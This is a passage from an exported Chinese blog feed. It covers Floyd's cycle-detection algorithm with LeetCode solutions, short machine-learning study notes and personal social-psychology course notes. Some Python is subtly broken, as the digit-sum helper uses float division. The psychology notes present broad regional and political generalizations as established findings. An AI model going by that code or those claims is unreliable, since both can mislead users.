<p>好比两个人在赛跑，A的速度快，B的速度慢，经过一定时间后，A总是会和B相遇，且相遇时A跑过的总距离减去B跑过的总距离一定是圈长的n倍（初中数学题……）。</p>
<p>弗洛伊德（Floyd ）使用了两个指针，一个慢指针（龟）每次前进一步，快指针（兔）指针每次前进两步（两步或多步效果是等价的，只要一个比另一个快就行。但是如果移动步数增加，算法的复杂度可能增加）。如果两者在链表头以外（不包含开始情况）的某一点相遇（即相等）了，那么说明链表有环，否则，如果（快指针）到达了链表的结尾（如果存在结尾，肯定无环），那么说明没环。</p>
<p>环的检测从上面的解释理解起来应该没有问题。接下来我们来看一下如何确定环的起点，这也是Floyd解法的第二部分。方法是将慢指针（或快指针）移到链表起点，然后两者同时移动，每次移动一步，那么两者相遇的地方就是环的起点。</p>
<p>下面给出论证过程：</p>
<p>假设一个链表是下面这样的：</p>
<p><img src="/images/loading.gif" data-original="/posts/d0e97dc/18457849-750a9f00bdeb8925.jpg" alt></p>
<p>设环长为n，非环形部分长度为m，当第一次相遇时显然slow指针行走了 m+A*n+k（A表示slow行走了A圈。附：A*n 是因为如果环够大，则他们的相遇需要经过好几环才相遇）。fast行走了 m+B*n+k。</p>
<p>上面我们说了slow每次行走一步，fast每次行走两步，则在同一时间，fast行走的路程是slow的两倍。假设slow行走的路程为S，则fast行走的路程为2S。</p>
<p>用fast减去slow可得：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">S&#x3D;（B-A）*n</span><br></pre></td></tr></table></figure></div>
<p>很显然这意味着当slow和fast相遇时他们走过的路程都为圈长的倍数。</p>
<p>接下来，将slow移动到起点位置，如下图：</p>
<p><img src="/images/loading.gif" data-original="/posts/d0e97dc/18457849-4a446028310ccb30.jpg" alt></p>
<p>然后每次两个指针都只移动一步，当slow移动了m，即到达了环的起点位置，此时fast总共移动了 2S+m。 考虑到S为环长的倍数，可以理解为：fast先从链表起点出发，经过了m到达环的起点，然后绕着环移动了几圈，最终又到达环的起点，值为2S+m。所以fast最终必定处在环的起点位置。即两者相遇点即为环的起点位置。</p>
<h1 id="LeetCode141"><a href="#LeetCode141" class="headerlink" title="LeetCode141"></a>LeetCode141</h1><blockquote>
<p>Given a linked list, determine if it has a cycle in it.<br><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Definition for singly-linked list.   </span><br><span class="line"> class ListNode(object):  </span><br><span class="line">    def __init__(self, x):  </span><br><span class="line">        self.val &#x3D; x  </span><br><span class="line">        self.next &#x3D; None</span><br></pre></td></tr></table></figure></div><br>如何确定链表是否有环呢？</p>
</blockquote>
<p>Floyd判圈算法<br>假设龟兔从同一起点（链表的起始位置）出发，如果该链表有环，当兔子和乌龟均进入后，必定兔子会在领先乌龟一圈后与乌龟在链表的环中相遇。所以可以用以下代码判断链表是否有环。其中slow的起始位置为head，每次移动一步；fast的起始位置也为head，每次移动两步，当两者相遇时即说明该链表有环。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">def hasCycle(self, head):</span><br><span class="line">    try:</span><br><span class="line">        slow &#x3D; head</span><br><span class="line">        fast &#x3D; head.next</span><br><span class="line">        while slow is not fast:</span><br><span class="line">            slow &#x3D; slow.next</span><br><span class="line">            fast &#x3D; fast.next.next</span><br><span class="line">        return True</span><br><span class="line">    except:</span><br><span class="line">        return False</span><br></pre></td></tr></table></figure></div>
<p>wiki上的python代码<br><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">def floyd(f, x0):</span><br><span class="line">     tortoise &#x3D; f(x0)       # f(x0) is the element&#x2F;node next to x0.</span><br><span class="line">     hare &#x3D; f(f(x0))</span><br><span class="line">     while tortoise !&#x3D; hare:</span><br><span class="line">         tortoise &#x3D; f(tortoise)</span><br><span class="line">         hare &#x3D; f(f(hare))</span><br><span class="line">         if (tortoise &#x3D;&#x3D; hare):</span><br><span class="line">            return True</span><br><span class="line">     return False</span><br></pre></td></tr></table></figure></div><br>那么，如何判断环的长度呢？</p>
<p>首先要确定链表中有环。</p>
<p>假设环起始的位置距离链表起始距离为m，而环的长度为λ，第一次相遇点距离环的起点距离为k。则第一次相遇时乌龟走过的距离ν = m + λ <em> a + k， 兔子走过的距离2ν = m + λ </em> b + k。所以ν = (b-a) * λ 为环长度的倍数。</p>
<p>此时将兔子抓回起点命令其以和乌龟同样的速度行走，而乌龟则在原地继续以之前的速度行走。当兔子的行走距离为m（即走到环的起点）时，乌龟走了ν + m，而由于ν为环长度的倍数，所以此时乌龟也走在环的起点，即兔子和乌龟相遇在环的起点。</p>
<p>当然还有更简便的方法，当两者相遇后，命令乌龟静止不动，兔子降速为每次前进一步，当兔子再次遇见乌龟时，它比乌龟多跑的距离就是环的长度。</p>
<p>求环的长度<br><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">def floyd(f, x0):</span><br><span class="line"></span><br><span class="line">    tortoise &#x3D; f(x0) # f(x0) is the element&#x2F;node next to x0.</span><br><span class="line">    hare &#x3D; f(f(x0))</span><br><span class="line">    while tortoise !&#x3D; hare:</span><br><span class="line">        tortoise &#x3D; f(tortoise)</span><br><span class="line">        hare &#x3D; f(f(hare))</span><br><span class="line"></span><br><span class="line">    # 方法一、乌龟回到原点，兔子降速（与兔子回原点降速相同）    </span><br><span class="line">    m &#x3D; 0</span><br><span class="line">    tortoise &#x3D; x0</span><br><span class="line">    while tortoise !&#x3D; hare:</span><br><span class="line">        tortoise &#x3D; f(tortoise)</span><br><span class="line">        hare &#x3D; f(hare)   # Hare and tortoise move at same speed</span><br><span class="line">        m +&#x3D; 1</span><br><span class="line"> </span><br><span class="line">    # 方法二、乌龟静止不动，兔子降速每次前进一步</span><br><span class="line">    lam &#x3D; 1</span><br><span class="line">    hare &#x3D; f(tortoise)</span><br><span class="line">    while tortoise !&#x3D; hare:</span><br><span class="line">        hare &#x3D; f(hare)</span><br><span class="line">        lam +&#x3D; 1</span><br><span class="line"> </span><br><span class="line">    return lam, m</span><br></pre></td></tr></table></figure></div><br>习得龟兔同跑的判圈算法后，来看一下</p>
<h1 id="LeetCode-202"><a href="#LeetCode-202" class="headerlink" title="LeetCode 202"></a>LeetCode 202</h1><blockquote>
<p>Write an algorithm to determine if a number is “happy”.</p>
<p>A happy number is a number defined by the following process: Starting with any positive integer, replace the number by the sum of the squares of its digits, and repeat the process until the number equals 1 (where it will stay), or it loops endlessly in a cycle which does not include 1. Those numbers for which this process ends in 1 are happy numbers.</p>
</blockquote>
<p>“happy数”的含义为：将一个数字的每位平方后相加，相加后的数继续进行每位平方后相加，如此循环，当相加到最后的数字始终为1时，即为”happy数”。</p>
<p>Example: 19 is a happy number</p>
<p>1^2 + 9^2 = 82<br>8^2 + 2^2 = 68<br>6^2 + 8^2 = 100<br>1^2 + 0^2 + 0^2 = 1<br>Python解决方案：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">def digitSquareSum(n):</span><br><span class="line">    sum, tmp &#x3D; 0, 0</span><br><span class="line">    while n:</span><br><span class="line">        tmp &#x3D; n % 10</span><br><span class="line">        sum +&#x3D; tmp * tmp</span><br><span class="line">        n &#x2F;&#x3D; 10</span><br><span class="line">    return sum</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def isHappy(n):</span><br><span class="line">    slow &#x3D; digitSquareSum(n)</span><br><span class="line">    fast &#x3D; digitSquareSum(digitSquareSum(n))</span><br><span class="line">    while slow !&#x3D; fast:</span><br><span class="line">        slow &#x3D; digitSquareSum(slow)</span><br><span class="line">        fast &#x3D; digitSquareSum(digitSquareSum(fast))</span><br><span class="line">    if slow &#x3D;&#x3D; 1:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br></pre></td></tr></table></figure></div>
<h1 id="leetcode287"><a href="#leetcode287" class="headerlink" title="leetcode287"></a>leetcode287</h1><p>Find the Duplicate Number</p>
<blockquote>
<p>Given an array nums containing n + 1 integers where each integer is between 1 and n (inclusive), prove that at least one duplicate number must exist. Assume that there is only one duplicate number, find the duplicate one.</p>
<p>Example 1:<br>Input: [1,3,4,2,2]<br>Output: 2<br>Example 2:<br>Input: [3,1,3,4,2]<br>Output: 3<br>Note:<br>You must not modify the array (assume the array is read only).<br>You must use only constant, O(1) extra space.<br>Your runtime complexity should be less than O(n2).<br>There is only one duplicate number in the array, but it could be repeated more than once.</p>
</blockquote>
<p>给定一个包含 n + 1 个整数的数组 nums，其数字都在 1 到 n 之间（包括 1 和 n），可知至少存在一个重复的整数。假设只有一个重复的整数，找出这个重复的数。</p>
<p>示例 1:</p>
<p>输入: [1,3,4,2,2]<br>输出: 2<br>示例 2:</p>
<p>输入: [3,1,3,4,2]<br>输出: 3<br>说明：</p>
<p>不能更改原数组（假设数组是只读的）。<br>只能使用额外的 O(1) 的空间。<br>时间复杂度小于 O(n2) 。<br>数组中只有一个重复的数字，但它可能不止重复出现一次。</p>
<p>此处时间空间都做出的限制，O(1)代表不能另辟空间，因此不能用简单的方法去做，由于数组中元素大小都是正整数且都小于数组长度，因此可将数组中的每个值视为对应空间的后继索引，视为链表。<br><img src="/images/loading.gif" data-original="/posts/d0e97dc/18457849-54230549b1ebf583.png" alt></p>
<p>Solution：<br><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def findDuplicate(self, nums: List[int]) -&gt; int:</span><br><span class="line">        tortoise &#x3D; nums[0]</span><br><span class="line">        hare &#x3D; nums[0]</span><br><span class="line">        while True:</span><br><span class="line">            tortoise &#x3D; nums[tortoise]</span><br><span class="line">            hare &#x3D; nums[nums[hare]]</span><br><span class="line">            if tortoise &#x3D;&#x3D; hare:</span><br><span class="line">                break</span><br><span class="line">        #进入圈中    </span><br><span class="line">        #圈的起点就是答案</span><br><span class="line">        ptr1 &#x3D; nums[0]</span><br><span class="line">        ptr2 &#x3D; tortoise</span><br><span class="line">        while ptr1 !&#x3D; ptr2:</span><br><span class="line">            ptr1 &#x3D; nums[ptr1]</span><br><span class="line">            ptr2 &#x3D; nums[ptr2]</span><br><span class="line">            </span><br><span class="line">        return ptr1</span><br></pre></td></tr></table></figure></div></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
  </entry>
  <entry>
    <title>Gradient_Descent</title>
    <url>/posts/a9f72c55/</url>
    <content><![CDATA[<p>学习率的设置（Adagrad方法）<br><img src="/images/loading.gif" data-original="/posts/a9f72c55/18457849-84480110c3109ac1.png" alt><a id="more"></a></p>
<p><img src="/images/loading.gif" data-original="/posts/a9f72c55/18457849-8b724369a74526f6.png" alt><br>均方根<br><img src="/images/loading.gif" data-original="/posts/a9f72c55/18457849-4b70ddbb4b1e1f94.png" alt><br>特征缩放（归一化）：<br><img src="/images/loading.gif" data-original="/posts/a9f72c55/18457849-707b06d2654360de.png" alt><br><img src="/images/loading.gif" data-original="/posts/a9f72c55/18457849-b69312ceb1503025.png" alt><br><img src="/images/loading.gif" data-original="/posts/a9f72c55/18457849-ba8ae7894edd0fb0.png" alt></p>
]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>误差分析</title>
    <url>/posts/9131fc5/</url>
    <content><![CDATA[<p>error 来源有<strong>bias</strong>和<strong>variance</strong>。<a id="more"></a></p>
<p><img src="/images/loading.gif" data-original="/posts/9131fc5/18457849-0611d19a3d3c7467.png" alt><br><img src="/images/loading.gif" data-original="/posts/9131fc5/18457849-1fb4665263e7a8f4.png" alt><br><img src="/images/loading.gif" data-original="/posts/9131fc5/18457849-d50a3b6c3334ee9c.png" alt="注:LS反了"><br>当N比较大时，样本分布比较集中<br><img src="/images/loading.gif" data-original="/posts/9131fc5/18457849-45959247998fbbbe.png" alt><br><img src="/images/loading.gif" data-original="/posts/9131fc5/18457849-62a4c89bd86279c6.png" alt><br><img src="/images/loading.gif" data-original="/posts/9131fc5/18457849-44e099999b5e87cc.png" alt><br><img src="/images/loading.gif" data-original="/posts/9131fc5/18457849-869f09fb7279e01c.png" alt><br>模型越复杂拟合获得的$f^*$散布越广<br><img src="/images/loading.gif" data-original="/posts/9131fc5/18457849-9c6d02508feabd96.png" alt><br>为什么比较复杂的model散布就比较开？<br>因为简单的model比较不会受data的影响，正如复杂的系统稳定性就比较弱<br><img src="/images/loading.gif" data-original="/posts/9131fc5/18457849-571963e22bfbd6bf.png" alt="image.png"><br>越复杂的模型，散布就比较开，但是平均起来是更接近的<br><img src="/images/loading.gif" data-original="/posts/9131fc5/18457849-63ee1a4cb2b6d2c9.png" alt><br>越复杂的模型，bias越小，variance越大<br>应为一个简单的model，他的function set就限定比较小，可能就根本没有包含target，而复杂的model就会包含target<br><img src="/images/loading.gif" data-original="/posts/9131fc5/18457849-a158fb3890e67ac6.png" alt><br><img src="/images/loading.gif" data-original="/posts/9131fc5/18457849-30711b558dca66c6.png" alt><br><img src="/images/loading.gif" data-original="/posts/9131fc5/18457849-65a7d4a168b5a90e.png" alt><br>增加数据的方法：</p>
<ul>
<li>一是正常地获取数据</li>
<li>二是，根据自己对这个问题的理解，制造假的data，即数据增强，例如在做手写辨识时，将已有的data图片进行旋转获得新的data，做动物识别时，可以将图片进行左右翻转获得新的data。还有就是声音辨识，将男女声音用变声器互相转化。将录音室的声音转化为公共场所的声音（加一些杂音）。<br>正则化：<br>正则化只保留那些平滑一些的曲线，但是可能误删正确的曲线。<br><img src="/images/loading.gif" data-original="/posts/9131fc5/18457849-558cc092c62fafab.png" alt><br>测试集的误差会小于未有测试集（泛化性）的误差<br>如何解决测试集的误差和真实测试集的误差不同？：<br><img src="/images/loading.gif" data-original="/posts/9131fc5/18457849-d4971e09f0ba5c1c.png" alt><br>交叉验证：<br>将训练集分为小训练集+验证集，用小训练集训练不同的model，用验证集得到具有最小err的Model，并用整个训练集去训练这个Model，这样得到的public testing set 的Err就和private  testing ser的Err差不多。但是呢，不要刻意让训练集得到的模型贴近于测试集的数据，因为这样做相当于把public Testing Set 当做了训练集。在测试性能之前，不要把测试集暴露给训练集。</li>
</ul>
<p>交叉验证方法：（取平均误差）<br><img src="/images/loading.gif" data-original="/posts/9131fc5/18457849-ffef0458c7e93ce4.png" alt></p>
]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>误差分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Machine_Notebook</title>
    <url>/posts/d3534f1c/</url>
    <content><![CDATA[<p>杂碎知识。<a id="more"></a></p>
<h1 id="机器学习的目的"><a href="#机器学习的目的" class="headerlink" title="机器学习的目的"></a>机器学习的目的</h1><p><strong>looking for a function from data</strong><br>function的集合{$f_1,f_2,…,f_n$}称之为model<br>由Training data 可测试function 的好坏<br>然后用新数据测试function，看f有没有举一反三的能力（泛化性能）</p>
<h1 id="机器学习分类"><a href="#机器学习分类" class="headerlink" title="机器学习分类"></a>机器学习分类</h1><p><img src="/images/loading.gif" data-original="/posts/d3534f1c/18457849-d0ffb9309fed5f16.png" alt></p>
<h2 id="回归（regression）"><a href="#回归（regression）" class="headerlink" title="回归（regression）"></a>回归（regression）</h2><p>The output of target function f is “scalar” - 能预测一个值</p>
<h2 id="分类（classification）"><a href="#分类（classification）" class="headerlink" title="分类（classification）"></a>分类（classification）</h2><p>二元（多元）分类，输出是否</p>
<p>以上二者被称之<strong>监督学习（supervised learning）</strong>，<strong>需要大量的training data</strong></p>
<p>其次有<strong>半监督学习（semi-supervised learning）</strong>，其训练数据部分有答案，部分无答案，但是无答案部分对学习依然有利</p>
<p>接着是<strong>迁移学习（Transfer learning）</strong> 例如我们的目的是分辨猫狗，然而学习资料含有其他图片</p>
<p><strong>无监督学习（unsupervised learning）</strong> 是训练数据没有答案，例如聚类、给图片让机器自己画图</p>
<p><strong>结构化学习（strctured learning）</strong>beyond classfication，输出是具有一定结构性的东西，例如输入声音-&gt;f-&gt;输出文字（结构性），人脸识别<br><img src="/images/loading.gif" data-original="/posts/d3534f1c/18457849-f44fa833b1e85169.png" alt></p>
<p><strong>强化学习（Reinforcement learning）</strong>给机器训练数据，数据不给正确答案，但是在每次训练后会告诉机器其正确率（分数），在评价中学习，只知道做得好不好，但是不知道哪里做得不好。近年来应用于阿尔法狗而广受关注，机器与机器对抗（下棋）。</p>
<h1 id="回归"><a href="#回归" class="headerlink" title="回归"></a>回归</h1><p>随着模型次数上升，越复杂的modle的训练数据loss越小，但是越容易产生<strong>过拟合（overfitting）</strong>，其表现为训练时情况很好，但是做新题时做得很差。</p>
<p>解决overfitting用更多的data，增加数据减缓过拟合。</p>
<p>在不同种类中，可能对其产生影响，因此可以引入<strong>虚拟变量</strong>，不同种类的宝可梦CP值变化不同，<br><img src="/images/loading.gif" data-original="/posts/d3534f1c/18457849-4835ff380e878e08.png" alt><br><img src="/images/loading.gif" data-original="/posts/d3534f1c/18457849-49371ca89dd0b4e8.png" alt></p>
<h2 id="Regularization（正则化）"><a href="#Regularization（正则化）" class="headerlink" title="Regularization（正则化）"></a>Regularization（正则化）</h2><p><img src="/images/loading.gif" data-original="/posts/d3534f1c/18457849-2f61e185c36cf205.png" alt><br><img src="/images/loading.gif" data-original="/posts/d3534f1c/18457849-4ad01fa000662161.png" alt><br>由于过拟合是因为参数过大，对噪音过于敏感，因此对参数进行惩罚，参数越大惩罚度（$\lambda$）越大，使得函数更平滑。<br>但是呢，$\lambda$越大，训练时的loss越大（<strong>欠拟合</strong>），但是Testing时的效果可能变小。<br>下图表现$\lambda$越大，参数值就会越来越小，变得很没效果。<br><img src="/images/loading.gif" data-original="/posts/d3534f1c/18457849-0053bf2069aa4aed.jpg" alt></p>
]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
  </entry>
  <entry>
    <title>Classification</title>
    <url>/posts/880faae9/</url>
    <content><![CDATA[<p>分类问题问题<br>如果用y=b+w1x1+w2x2回归拟合<br>class1 是1<br>class2 是-1<br>得出的曲线会因为<strong>噪点而出错</strong><a id="more"></a></p>
<p><img src="/images/loading.gif" data-original="/posts/880faae9/18457849-772cd2d358ebdcfa.png" alt><br><img src="/images/loading.gif" data-original="/posts/880faae9/18457849-a84a085a0bc86633.png" alt><br><img src="/images/loading.gif" data-original="/posts/880faae9/18457849-fe3ff362d1b4a3a2.png" alt><br><img src="/images/loading.gif" data-original="/posts/880faae9/18457849-3ad58043867a350f.png" alt><br><img src="/images/loading.gif" data-original="/posts/880faae9/18457849-59620379bc3d6c78.png" alt><br><img src="/images/loading.gif" data-original="/posts/880faae9/18457849-e0caabf835ea852e.png" alt><br><img src="/images/loading.gif" data-original="/posts/880faae9/18457849-a78e335e0d555e13.png" alt><br><img src="/images/loading.gif" data-original="/posts/880faae9/18457849-7a3dfc50d4d6dfb4.png" alt><br>一般假设类的方差相同，则得到下面的结论<br><img src="/images/loading.gif" data-original="/posts/880faae9/18457849-1664b54ff01e99df.png" alt><br>得出逻辑回归</p>
<p>梯度：<br><img src="/images/loading.gif" data-original="/posts/880faae9/18457849-16f2f96df96d047c.png" alt><br><img src="/images/loading.gif" data-original="/posts/880faae9/18457849-fd5de0430474b0ba.png" alt><br>得出的梯度和线性回归一样的</p>
<p>为什么不能用平方误差？<br><img src="/images/loading.gif" data-original="/posts/880faae9/18457849-f085df2c41450eff.png" alt><br><img src="/images/loading.gif" data-original="/posts/880faae9/18457849-a3fe98b0cc85d78e.png" alt><br>距离目标近和远的梯度都很小，难以用梯度下降法<br><img src="/images/loading.gif" data-original="/posts/880faae9/18457849-fd5ee212d418612b.png" alt></p>
<p><img src="/images/loading.gif" data-original="/posts/880faae9/18457849-ed353b77af6529e3.png" alt><br>逻辑回归不能做异或问题</p>
<p>解决：做非线性变换<br><img src="/images/loading.gif" data-original="/posts/880faae9/18457849-bc482800dd8344aa.png" alt></p>
<p>导出神经网络-多层感知机<br><img src="/images/loading.gif" data-original="/posts/880faae9/18457849-0d5cb52adeb0ea6d.png" alt></p>
]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>社会心理学与生活课程笔记</title>
    <url>/posts/fe25ace7/</url>
    <content><![CDATA[<p><img src="/images/loading.gif" data-original="/posts/fe25ace7/18457849-137bbdb7eed6e3b9.png" alt></p>
<p>小学期真是美好呀，终于可以选选校选了<br>_(:3」∠)_<br>以下都是一些上课记录下的有趣的玩意儿和笔者的一些拙见~<a id="more"></a></p>
<h1 id="第一堂课"><a href="#第一堂课" class="headerlink" title="第一堂课"></a>第一堂课</h1><p><strong>1）当某人集中专注某件事情时，那此事必是（有点太绝对啦）其痛点。</strong></p>
<p><strong>延伸案例</strong>：2016特朗普获选美国总统一职，但是研究总统竞选的统计局却预测出应该是希拉里（希拉里是一个非常出色的女性，其丈夫是著名的总统克林顿（有出轨史），但是她依然能坚持到现在还未离婚）获选（该统计局据说从未预测出错）<br><strong>原因分析</strong>：2016年之前美国竞选总统的选票大多数是由群众投纸质的票，然而在新时代数字媒体技术逐渐渗入人们的生活，成为人们生活必不可少的一部分（这边人们指American），时代一有纸媒时代转向数媒时代，选民可以通过<strong>互联网</strong>投票，正因如此，老奸巨猾的特朗普依靠其背后强大的<strong>大数据团队</strong>，对推特、脸书、油管等社交媒体网站的用户进行分析。如何分析呢？通过对用户平时都关注哪些话题、给哪些文章或图片点赞的分析，将其表现的思想主张与民主党或者共产党的主张做比较，来分析其的主张倾向（即使用户并未表现出其支持民主党还是共和党）。对于思想主张与民主党主张相近的，给用户推有关民主党的批评文章和推宣扬共和党优点的文章，从而操控（有点夸张）网络选民的思想。特朗普的做法虽有很大成效，但是希拉里还是很强的，最后是希拉里实际总票数是比特朗普多的。然而，出于美国奇葩的选举制度（选票要一个州一个州地进行PK），最后特朗普居然赢了。那为何统计局会出错呢，因为该统计局是研究传统选举的统计局，研究对象是那些采用纸质投票的选民，统计对象失去可靠性（只研究纸媒），于是最后预测出错。<br>所以为何特朗普如此喜欢打压中国的互联网产业的崛起呢？因为他的崛起就是依靠互联网技术（可能是全世界所有领导人互联网玩得最六的吧，推特治国嘻嘻）。通过根据上述心理学结论，互联网技术就是其痛点，从而延伸到上述特朗普获选的原因。<br><strong>2）中国南北方人思想观念差异</strong><br>         该下研究是美国人研究出来的（吐个槽，为什么中国人自己搞不懂自己）<br>某个理论介绍：酒精的分解：乙醇（CH₃CH₂OH）-&gt;乙醛（CH₃CHO）-&gt;乙酸（CH3COOH）-&gt;水（H₂O）+二氧化碳（CO2）<br>酒精性脸红：在酒精分解过程中，如果乙醛（有害物质）不能及时分解（缺少分解的酶）成乙酸，就会使人脸红（据说黄种人才会这样）。<br>我们经常听说<strong>常吃面食的人会喝酒</strong>，这是为什么呢？因为对小麦分解能力是和对乙醛的分解能力是等效的或者正相关的（这要请化学大佬证实，笔者不做详述），这是北方人刻在DNA里的酒量呀！<br><strong>那中国南北方人的思想观念是否与饮食有关系呢，答案是有的！</strong><br>某个美国人在中国南北方农村做一个简单的调查研究，他将{<strong>牛</strong>，<strong>鸟</strong>，<strong>草</strong>}写在纸上，让中国农民将其分成两类，结果你猜怎么呢（你也可以想一下）？</p>
<p>结果统计数据显示：<br>北方农民更多将其分为{<strong>牛</strong>，<strong>鸟</strong>}、{<strong>草</strong>}两类；<br>南方农民更多将其分为{<strong>牛</strong>，<strong>草</strong>}、{<strong>鸟</strong>}两类。<br>这体现了什么呢？<br>北方人是因为牛和鸟都是动物，因此将其分为一类；而南方人是因为存在牛吃草这种<strong>关系</strong>，而将其分为一类。<br>根据生活经验，我们可以发现，种水稻的人比较团结，注重人际关系（种水稻是和别人共用一渠水的，要和他人处理好关系），更勤劳（因为中国耕地南少北多，水稻不够吃的，一年需要二种三种，这跟气候条件共同作用；其次水稻种植复杂，程序多），因此种水稻的人会经常考虑多种关系，潜意识里<strong>关系意识</strong>多一些，这体现在哪呢？可以发现，由于这种关系意识，南方人很注重人情关系，再尔，南方人比北方人<strong>离婚率低</strong>，很多南方人夫妻，在大吵一顿后，其中一方或双方会考虑到孩子还小、有很多亲戚、人情关系等方面，最后一般都会和好。 而对于种小麦的人，因为北方耕地多，种小麦工序简单，一年只需要一种，潜意识并没有南方人的那种关系意识。再者，北方人由于种小麦时间少，可以有更多的休闲时间消遣（比如跳广场舞啥的），这也造就了北方人经常和朋友聚会喝酒等消遣时间。在对于离婚方面，北方人夫妻一般都是互不相让的。<br><strong>3）中西方文化差异</strong><br>自古以来，中国都是主张<strong>和平、让步、助人</strong>的思想（太极中庸），例如郑和下西洋，都没有对沿途国家进行侵占、抢劫，反倒是送给他们金银财宝，而西方国家的航海行动都是为了侵略其他国家。<br>而这种思想也成了当今中国的一个软肋，美国知悉中国主张让步的思想，即使中国强大，美国毫无后顾地加征中国关税，将航母开到中国领海等过分举措，是因为他知道中方主和平，最后一定会做出让步（惨兮兮）（中国不像伊拉克、朝鲜等战斗民族血质的国家）。</p>
<h1 id="社会关系的背后是情感联结"><a href="#社会关系的背后是情感联结" class="headerlink" title="社会关系的背后是情感联结"></a>社会关系的背后是情感联结</h1><p>先看几个案例：<br>       在五十年前的中国，父母与孩子的关系主要是<u><em>传宗接代</em></u>和<u><em>物质供养</em></u>的<strong>物质关系</strong>；<br>       对于大部分内向的男生，在追求女生时，常常给中意的女生买早餐、买好吃好看的东西以博得女生的欢心（我初中同学就有一个这样，疯狂给喜欢的女孩子送好吃的(&gt;&lt;)），但是常有这样的场景——<br>W：你挺好，可是我们不适合<br>M：我对你这么好，你却这么对我？</p>
<p><strong>那么，社会除了物质关系还有什么关系呢？</strong></p>
<p>​        曾有美国心理学家哈洛做了一个这样的一个著名（残忍）的恒河猴实验：<br>将刚出生的小猴与母猴分开，提供两个假母亲，一个是铁丝猴，上面有奶瓶，另一个是一个毛布裹起来的假猴，会发热。小猴只在饥饿的时候才到“铁丝母猴”那里喝几口奶水，其他更多的时候都是与“绒布母猴”呆在一起；小猴在遭到不熟悉的物体，如一只木制的大蜘蛛的威胁时，会跑到“绒布母猴”身边并紧紧抱住它，似乎“绒布母猴”会给婴猴更多的安全感。</p>
<p><img src="/images/loading.gif" data-original="/posts/fe25ace7/18457849-d1bd187fe3b2d1b3.jpg" alt></p>
<p>​        最后，由铁丝猴抚养大的小猴性格孤僻，不愿意和其他猴子玩耍，难以融入群体，而毛猴养大的猴子表现出探索能力强，更愿意玩耍和融入群体。<br>这个实验（其实这个实验只是哈洛一系列残忍实验之一）说明什么了呢？<br>在个实验出现之前，一些研究者正在提倡减少“非必要”的母婴接触，一是为了卫生，减少母亲将病菌传给婴儿，二是为了避免“宠坏孩子”，担心一哭就得到安慰的婴儿会太过依赖大人，长大后会变得太过黏人无法独立。<br>这在古代西方社会也有所体现，例如，古罗马贵族的小孩是绝对不会让贵族自己培养的，而是让他在军营里长大，因为当时社会普遍认为父母自己抚养孩子、给予孩子过多的爱会使孩子长大后懦弱。这种情况在古代中国也有部分体现。<br>​         Harlow的猴子实验与后续的一些婴儿依恋实验却证明，事实恰恰相反，曾经被<strong>细心呵护</strong>、<strong>温柔拥抱</strong>、<strong>及时回应</strong>的孩子，<strong>才会成长为更独立、更能适应社会的大人</strong>。<br>​          我们与父母之间存在着<strong>依恋（attaching）关系</strong>。</p>
<p>​         在西方社会，我们常看到他们见面时的热情拥抱。拥抱（hug）是一个神奇的动作。<br>​         研究表明，拥抱会使人分泌<strong>催产素</strong>（男性也会分泌），这种激素会<strong>促使人呵护别人</strong>。例如，见过刚出生的婴儿都知道它是非常丑的，但是父母都觉得他很好看，很喜欢呵护他、抱他，这是因为父母与婴儿的拥抱会促使父母分泌更多的催产素，其实这是能由进化论来解释的，人类进化总是朝着利于种群繁衍方向发展的（如果连父母都不呵护自己的婴儿那么婴儿成活率很低）。<br>​           <strong>拥抱还会使人长寿！</strong></p>
<p>所以社会除了物质关系还有<strong>情感关系</strong></p>
<h1 id="社会情感：快乐还是悲伤"><a href="#社会情感：快乐还是悲伤" class="headerlink" title="社会情感：快乐还是悲伤"></a>社会情感：快乐还是悲伤</h1><p>“清明时节雨纷纷，路上行人欲断魂”，这是我们熟知的一句诗，然而有调查显示，清明节30%的祝福均是祝节日快乐，这有点令人惊讶。<br>那么悲伤情感的适用价值是什么呢？有两方面，一是给人一种信号预警，二是更容易引起社会网络的共鸣。</p>
